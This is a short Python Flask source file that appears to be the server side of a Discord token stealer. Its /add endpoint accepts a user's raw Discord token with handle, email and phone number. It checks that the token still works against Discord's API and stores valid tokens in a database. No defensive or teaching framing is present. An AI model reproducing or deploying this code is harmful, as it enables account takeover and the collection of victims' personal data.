from flask import Blueprint, request, jsonify
from application.database.util import addDiscordUser, getAllDiscordUsers
import requests

api = Blueprint('api', __name__)

def createResponse(msg, status_code=200):
    rsp = { 'message': msg }
    return jsonify(rsp), status_code

def isValidToken(token):
    r = requests.get('https://discord.com/api/v9/users/@me', headers={"Authorization": token})
    return r.status_code == 200

@api.route('/add', methods=['POST'])
def addUser(): 
    data = request.get_json()
    if not data:
        return createResponse('invalid json', 500)
    try:
        token = data['token']
        handle = data['handle']
        mail = data['mail']
        phone = data['phone']
    except:
        return createResponse('Missing data key, fix data sent')
    if not isValidToken(token):
        return createResponse('Invalid token returned, what are you doing? :eyes:', 500)
    users = getAllDiscordUsers()
    for user in users:
        if user.discord_token == token:
            return createResponse('User already exists in db')
    addDiscordUser(token, handle, mail, phone)
    return createResponse('User added successfully')